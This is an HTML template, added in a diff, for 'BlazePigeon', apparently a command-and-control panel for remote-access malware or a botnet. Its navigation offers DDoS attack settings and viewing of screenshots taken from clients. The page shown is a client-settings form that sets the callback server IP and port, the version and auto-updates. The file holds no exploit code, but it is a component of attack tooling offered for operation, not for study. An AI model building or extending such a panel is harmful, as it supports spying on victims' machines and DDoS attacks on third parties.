@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="shortcut icon" href="assets/images/favicon.svg" type="image/x-icon" />
+		<title>BlazePigeon控制面板</title>
+
+		<!-- ========== All CSS files linkup ========= -->
+		<link rel="stylesheet" href="/static/css/bootstrap.min.css" />
+		<link rel="stylesheet" href="/static/css/lineicons.css" />
+		<link rel="stylesheet" href="/static/css/bubble.css" />
+		<link rel="stylesheet" href="/static/css/snow.css" />
+		<link rel="stylesheet" href="/static/css/fullcalendar.css" />
+		<link rel="stylesheet" href="/static/css/morris.css" />
+		<link rel="stylesheet" href="/static/css/vanilla-datatables.min.css" />
+		<link rel="stylesheet" href="/static/css/main.css" />
+        <style>
+			body {
+				background-color: #222;
+			}
+		</style>
+	</head>
+	<body>
+		<!-- ======== sidebar-nav start =========== -->
+		<aside class="sidebar-nav-wrapper" style="background-color: #0d0821;">
+			<div class="navbar-logo">
+				<a href="/index/">
+					<img class="img-fluid" src="/static/picture/blaze.png" alt="logo" />
+				</a>
+			</div>
+			<nav class="sidebar-nav">
+				<ul>
+					<li class="nav-item">
+						<a href="/index/">
+							<span class="icon">
+								<svg width="22" height="22" viewBox="0 0 22 22">
+								</svg>
+							</span>
+							<span class="text">首页</span>
+						</a>
+					</li>
+					<li class="nav-item active">
+						<a href="/client_setting/">
+							<span class="icon">
+								<svg width="22" height="22" viewBox="0 0 22 22">
+								</svg>
+							</span>
+							<span class="text">客户端设置</span>
+						</a>
+					</li>
+					<li class="nav-item">
+						<a href="/ddos_setting_index/">
+							<span class="icon">
+								<svg width="22" height="22" viewBox="0 0 22 22">
+								</svg>
+							</span>
+							<span class="text">ddos攻击设置</span>
+						</a>
+					</li>
+					<li class="nav-item">
+						<a href="/picture/">
+							<span class="icon">
+								<svg width="22" height="22" viewBox="0 0 22 22">
+								</svg>
+							</span>
+							<span class="text">截图查看</span>
+						</a>
+					</li>
+				</ul>
+			</nav>
+		</aside>
+		<div class="overlay"></div>
+		<!-- ======== sidebar-nav end =========== -->
+
+		<!-- ======== main-wrapper start =========== -->
+		<main class="main-wrapper">
+			<!-- ========== header start ========== -->
+
+			<!-- ========== header end ========== -->
+
+			<!-- ========== section start ========== -->
+			<section class="section">
+				<div class="container-fluid">
+					<!-- ========== title-wrapper start ========== -->
+					<div class="title-wrapper pt-30">
+						<div class="row align-items-center">
+							<div class="col-md-6">
+								<div class="titlemb-30">
+									<h2>客户端设置</h2>
+								</div>
+							</div>
+						</div>
+						<!-- end row -->
+					</div>
+					<!-- ========== title-wrapper end ========== -->
+
+					<div class="row" style="margin-top: 20px;">
+						<div class="">
+							<div class="card-style settings-card-2 mb-30" style="background-color: lightgrey">
+								<div class="title mb-30">
+									<h6>全部设置</h6>
+								</div>
+								<form action="/update_client_set/" method="post">
+									<div class="row">
+										<div class="col-12">
+											<div class="input-style-1">
+												<label>服务端IP</label>
+												<input type="text" placeholder="服务端IP" value="{{ set_data.ip }}"
+													name="ip" />
+											</div>
+										</div>
+										<div class="col-12">
+											<div class="input-style-1">
+												<label>服务端端口</label>
+												<input type="text" placeholder="服务端端口" value="{{ set_data.port }}"
+													name="port" />
+											</div>
+										</div>
+										<div class="col-12">
+											<div class="input-style-1">
+												<label>当前版本</label>
+												<input type="text" placeholder="当前版本" value="{{ set_data.version }}"
+													name="version" />
+											</div>
+										</div>
+										<div class="col-xxl-4">
+											<div class="select-style-1">
+												<label>是否开启版本更新</label>
+												<div class="select-position">
+													<select class="light-bg" name="status">
+														<option value="{{ set_data.status }}">请选择</option>
+														<option value="是">是</option>
+														<option value="否">否</option>
+													</select>
+												</div>
+											</div>
+										</div>
+										<div class="col-12">
+											<button class="main-btn primary-btn btn-hover" type="submit">
+												确定
+											</button>
+										</div>
+									</div>
+								</form>
+							</div>
+							<!-- end card -->
+						</div>
+						<!-- end col -->
+					</div>
+					<!-- end row -->
+				</div>
+				<!-- end container -->
+			</section>
+			<!-- ========== section end ========== -->
+
+			<!-- ========== footer start =========== -->
+			<footer class="footer">
+				<div class="container-fluid">
+					<div class="row">
+						<div class="col-md-6 order-last order-md-first">
+							<div class="copyright text-center text-md-start">
+								<p class="text-sm">
+									Designed and Developed by
+									<a href="" rel="nofollow">
+										Blaze Pigeon
+									</a>
+								</p>
+							</div>
+						</div>
+						<!-- end col-->
+
+					</div>
+					<!-- end row -->
+				</div>
+				<!-- end container -->
+			</footer>
+			<!-- ========== footer end =========== -->
+		</main>
+		<!-- ======== main-wrapper end =========== -->
+
+		<!-- ============ Theme Option Start ============= -->
+		<!-- ============ Theme Option End ============= -->
+
+		<!-- ========= All Javascript files linkup ======== -->
+		<script src="/static/js/bootstrap.bundle.min.js"></script>
+		<script src="/static/js/chart.min.js"></script>
+		<script src="/static/js/apexcharts.min.js"></script>
+		<script src="/static/js/dynamic-pie-chart.js"></script>
+		<script src="/static/js/moment.min.js"></script>
+		<script src="/static/js/fullcalendar.js"></script>
+		<script src="/static/js/jvectormap.min.js"></script>
+		<script src="/static/js/world-merc.js"></script>
+		<script src="/static/js/polyfill.js"></script>
+		<script src="/static/js/quill.min.js"></script>
+		<script src="/static/js/vanilla-datatables.min.js"></script>
+		<script src="/static/js/main.js"></script>
+	</body>
+</html>
